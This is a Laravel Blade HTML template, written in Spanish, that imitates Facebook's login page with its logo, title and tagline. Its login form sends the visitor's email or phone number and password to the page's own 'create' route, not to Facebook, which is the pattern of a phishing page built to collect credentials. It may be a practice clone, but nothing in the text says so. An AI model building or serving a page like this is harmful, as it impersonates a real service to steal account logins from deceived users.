<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/facebook.css">
    <title>Login Facebook</title>
</head>

<body>
    <div class="container">
        <div class="container-profile">
            <span class="logo">
                <img src="./img/1.svg" alt="facebook">
            </span>
            <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="container-form">
            <form class="form" method="post" action="{{ route('create') }}">
                @csrf <!-- Agrega el token CSRF -->
                
                <input type="text" name="Nombre" placeholder="Correo electronico o numero de telefono">
                <input type="password" name="Contraseña" placeholder="Contraseña">
                <input type="submit" value="Iniciar Sesión">
                <span><a href="#">¿Olvidaste tu contraseña?</a></span>
                <div class="border"></div>
                <button><a href="#">Crear cuenta nueva</a></button>
            </form>
            <p class="create-page">
                <a href="#">Crear una pagina</a> para una celebridad , una marca o un <br> neogocio.
            </p>
        </div>
    </div>
</body>
</html>